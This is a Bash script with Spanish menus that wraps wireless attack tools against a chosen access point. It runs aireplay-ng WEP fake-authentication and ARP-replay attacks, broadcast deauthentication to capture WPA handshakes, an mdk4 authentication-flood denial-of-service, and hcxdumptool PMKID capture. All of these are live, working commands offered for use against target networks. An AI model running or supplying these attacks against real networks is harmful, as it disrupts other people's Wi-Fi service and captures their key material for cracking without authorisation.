#!/bin/bash

# By @m4lal0

# Regular Colors
Black='\033[0;30m'      # Black
Red='\033[0;31m'        # Red
Green='\033[0;32m'      # Green
Yellow='\033[0;33m'     # Yellow
Blue='\033[0;34m'       # Blue
Purple='\033[0;35m'     # Purple
Cyan='\033[0;36m'       # Cyan
White='\033[0;97m'      # White
Color_Off='\033[0m'     # Text Reset

# Additional colors
LGray='\033[0;37m'      # Ligth Gray
DGray='\033[0;90m'      # Dark Gray
LRed='\033[0;91m'       # Ligth Red
LGreen='\033[0;92m'     # Ligth Green
LYellow='\033[0;93m'    # Ligth Yellow
LBlue='\033[0;94m'      # Ligth Blue
LPurple='\033[0;95m'    # Light Purple
LCyan='\033[0;96m'      # Ligth Cyan

# Bold
BBlack='\033[1;30m'     # Black
BGray='\033[1;37m'		# Gray
BRed='\033[1;31m'       # Red
BGreen='\033[1;32m'     # Green
BYellow='\033[1;33m'    # Yellow
BBlue='\033[1;34m'      # Blue
BPurple='\033[1;35m'    # Purple
BCyan='\033[1;36m'      # Cyan

# Underline
UBlack='\033[4;30m'     # Black
UGray='\033[4;37m'		# Gray
URed='\033[4;31m'       # Red
UGreen='\033[4;32m'     # Green
UYellow='\033[4;33m'    # Yellow
UBlue='\033[4;34m'      # Blue
UPurple='\033[4;35m'    # Purple
UCyan='\033[4;36m'      # Cyan
UWhite='\033[4;37m'     # White

# Background
On_Black='\033[40m'     # Black
On_Red='\033[41m'       # Red
On_Green='\033[42m'     # Green
On_Yellow='\033[43m'    # Yellow
On_Blue='\033[44m'      # Blue
On_Purple='\033[45m'    # Purple
On_Cyan='\033[46m'      # Cyan
On_White='\033[47m'     # White

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BRed}Debes cerrar la ventana completa de Terminator.${Color_Off}\n"
    main
}

function question(){
    input=""
    while [ "$input" == "" ]; do
        echo -en "${LBlue}[${BPurple}?${LBlue}] ${BGray}$1: ${Color_Off}" && read input
    done
}

function readParameters(){
    test -f .output.txt
    if [ "$(echo $?)" == "0" ]; then
        INTERFACE=$(cat .interface.txt)
        ESSID=$(cat .output.txt)
        BSSID=$(cat output/$ESSID/.target.txt | grep "BSSID" | cut -d '|' -f 2)
        CHANNEL=$(cat output/$ESSID/.target.txt | grep "CHANNEL" | cut -d '|' -f 2)
        MAC=$(macchanger -s $INTERFACE | grep "Current" | xargs | cut -d ' ' -f 3)
    else
        clear
        echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Escanea el AP Objetivo primero...${Color_Off}\n"
        echo -en "${BGray}Presiona ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}cuando lo hayas realizado.${Color_Off}" && read
        readParameters
    fi
}

function WEP-fakeAuthentication(){
    clear
    echo -e "\n\t${LBlue}[${BYellow}!${LBlue}] ${BYellow}Iniciando Fake Authentication Attack${Color_Off}\n"
    sleep 3
    echo "Attack|WEP|Fake-Authentication" > .attack.txt 2>/dev/null
    aireplay-ng -1 0 -a $BSSID -h $MAC -e $ESSID $INTERFACE && aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID -h $MAC $INTERFACE
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar al menú.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function WEP-arpReplay(){
    clear
    echo -e "\n\t${LBlue}[${BYellow}!${LBlue}] ${BYellow}Iniciando ARP Replay Attack${Color_Off}\n"
    sleep 3
    echo "Attack|WEP|ARP-Replay" > .attack.txt 2>/dev/null
    aireplay-ng -3 –x 1000 –n 1000 –b $BSSID -h $MAC $INTERFACE
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar al menú.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function WPA-handshake(){
    clear
    echo -e "\n\t${LBlue}[${BYellow}!${LBlue}] ${BYellow}Iniciando Handshake Attack${Color_Off}\n"
    sleep 3
    echo "Attack|WPA|Handshake" > .attack.txt 2>/dev/null
    aireplay-ng -0 30 -e $ESSID -c FF:FF:FF:FF:FF:FF $INTERFACE
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar al menú.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function WPA-authDosMode(){
    clear
    echo -e "\n\t${LBlue}[${BYellow}!${LBlue}] ${BYellow}Iniciando Authentication DoS Mode Attack${Color_Off}\n"
    sleep 3
    echo "Attack|WPA|Dos-Mode" > .attack.txt 2>/dev/null
    mdk4 $INTERFACE a -a $BSSID 
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar al menú.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function WPA-PKMID(){
    clear
    echo -e "\n\t${LBlue}[${BYellow}!${LBlue}] ${BYellow}Iniciando PKMID Clientless Attack${Color_Off}\n"
    sleep 3
    echo "Attack|WPA|PKMID" > .attack.txt 2>/dev/null
    hcxdumptool -i $INTERFACE -o PKMID --enable_status=1
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar al menú.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function menuWEP(){
    clear
    echo -e "\n\t\t${BBlue}ATAQUES PARA REDES ${BGreen}WEP${Color_Off}"
    echo -e "\n${BGray}Selecciona el tipo de ataque:${Color_Off}\n"
    echo -e "\t${LBlue}[${BYellow}1${LBlue}] ${BYellow}Fake Authentication Attack${Color_Off}"
    echo -e "\t${LBlue}[${BYellow}2${LBlue}] ${BYellow}ARP Replay Attack${Color_Off}"
    echo -e "\t${LBlue}[${BYellow}0${LBlue}] ${BYellow}Regresar al menú anterior.${Color_Off}\n"
    question "Opción"
    case $input in
        1) WEP-fakeAuthentication ;;
        2) WEP-arpReplay ;;
        0) menuAttack ;;
        *) echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}Opción inválida.${Color_Off}" ; sleep 2 ; menuWEP ;;
    esac
}

function menuWPA(){
    clear
    echo -e "\n\t\t${BBlue}ATAQUES PARA REDES ${BGreen}WPA / WPA2 - PSK${Color_Off}"
    echo -e "\n${BGray}Selecciona el tipo de ataque:${Color_Off}\n"
    echo -e "\t${LBlue}[${BYellow}1${LBlue}] ${BYellow}Handshake${Color_Off}"
    echo -e "\t${LBlue}[${BYellow}2${LBlue}] ${BYellow}Authentication DoS Mode${Color_Off}"
    echo -e "\t${LBlue}[${BYellow}3${LBlue}] ${BYellow}PKMID Clientless Attack${Color_Off}"
    echo -e "\t${LBlue}[${BYellow}0${LBlue}] ${BYellow}Regresar al menú anterior.${Color_Off}\n"
    question "Opción"
    case $input in
        1) WPA-handshake ;;
        2) WPA-authDosMode ;;
        3) WPA-PKMID ;;
        0) menuAttack ;;
        *) echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}Opción inválida.${Color_Off}" ; sleep 2 ; menuWPA ;;
    esac
}

function menuAttack(){
    clear
    echo -e "\n\t\t${BBlue}MENU DE ATAQUES${Color_Off}"
    echo -e "\n${BGray}Selecciona el tipo de red del AP Objetivo${Color_Off}\n"
    echo -e "\t${LBlue}[${BYellow}1${LBlue}] ${BYellow}WEP${Color_Off}"
    echo -e "\t${LBlue}[${BYellow}2${LBlue}] ${BYellow}WPA / WPA2 - PSK${Color_Off}\n"
    question "Opción"
    case $input in
        1) menuWEP ;;
        2) menuWPA ;;
        *) echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}Opción inválida.${Color_Off}" ; sleep 2 ; menuAttack ;;
    esac
}

function main(){
    readParameters
    menuAttack
}

main